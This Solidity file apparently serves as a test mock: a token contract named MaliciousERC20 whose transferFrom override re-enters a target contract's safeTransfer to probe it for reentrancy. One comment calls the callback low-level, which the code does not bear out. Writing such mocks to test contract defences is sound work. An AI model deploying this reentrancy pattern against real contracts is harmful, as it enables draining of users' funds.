// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface IFinCube {
    function safeTransfer(
        address from,
        address to,
        uint256 amount,
        string calldata memo
    ) external;
}

contract MaliciousERC20 is ERC20 {
    address public target; // contract to call back into (FinCube)
    bool public attackEnabled;
    address public attackerFrom;
    address public attackerTo;
    uint256 public attackAmount;

    constructor(
        string memory name_,
        string memory symbol_
    ) ERC20(name_, symbol_) {}

    function setTargetContract(address _t) external {
        target = _t;
    }

    function enableAttack(
        address _from,
        address _to,
        uint256 _amount
    ) external {
        attackerFrom = _from;
        attackerTo = _to;
        attackAmount = _amount;
        attackEnabled = true;
    }

    function disableAttack() external {
        attackEnabled = false;
    }

    // override transferFrom to attempt reentrancy when attackEnabled and caller is the FinCube contract
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        // perform the normal transfer first
        bool ok = super.transferFrom(sender, recipient, amount);

        // then, if configured, attempt callback reentrancy
        if (attackEnabled && msg.sender == target) {
            // call back into FinCube.safeTransfer (or a susceptible function)
            // NOTE: call via low-level to ignore return checks
            IFinCube(target).safeTransfer(
                attackerFrom,
                attackerTo,
                attackAmount,
                "attack-memo"
            );
        }

        return ok;
    }

    // helper mint for tests
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}
